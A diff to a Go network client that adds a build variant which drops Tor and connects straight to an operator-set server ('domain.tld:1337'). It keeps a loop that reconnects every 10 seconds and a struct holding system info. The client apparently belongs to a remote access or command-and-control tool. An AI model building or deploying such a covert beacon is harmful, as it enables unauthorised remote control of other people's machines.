@@ -1,4 +1,4 @@
-// +build !notor
+// +build notor
 
 package client
 
@@ -8,13 +8,11 @@ import (
 	"log"
 	"net"
 	"time"
-
-	"github.com/cretz/bine/tor"
 )
 
 const (
 	// serverDomain needs to be changed to your address
-	serverDomain = "youronionadresshere.onion"
+	serverDomain = "domain.tld"
 	serverPort   = ":1337"
 	serverAddr   = serverDomain + serverPort
 )
@@ -30,8 +28,8 @@ type connection struct {
 	Sysinfo string
 }
 
-func connect(dialer *tor.Dialer) (net.Conn, error) {
-	conn, err := dialer.Dial("tcp", serverAddr)
+func connect() (net.Conn, error) {
+	conn, err := net.Dial("tcp", serverAddr)
 	if err != nil {
 		return nil, err
 	}
@@ -49,16 +47,8 @@ func connect(dialer *tor.Dialer) (net.Conn, error) {
 
 func NetClient() {
 	log.Println("NetClient")
-	conf := tor.StartConf{ExePath: TorExe, ControlPort: 9051, DataDir: TorData, NoAutoSocksPort: true}
-	t, err := tor.Start(nil, &conf)
-	if err != nil {
-		log.Println("[!] Tor could not be started:", err)
-		return
-	}
-	defer t.Close()
-	dialer, _ := t.Dialer(nil, nil)
 	for {
-		conn, err := connect(dialer)
+		conn, err := connect()
 		if err != nil {
 			log.Println("Could not connect:", err)
 			time.Sleep(10 * time.Second)
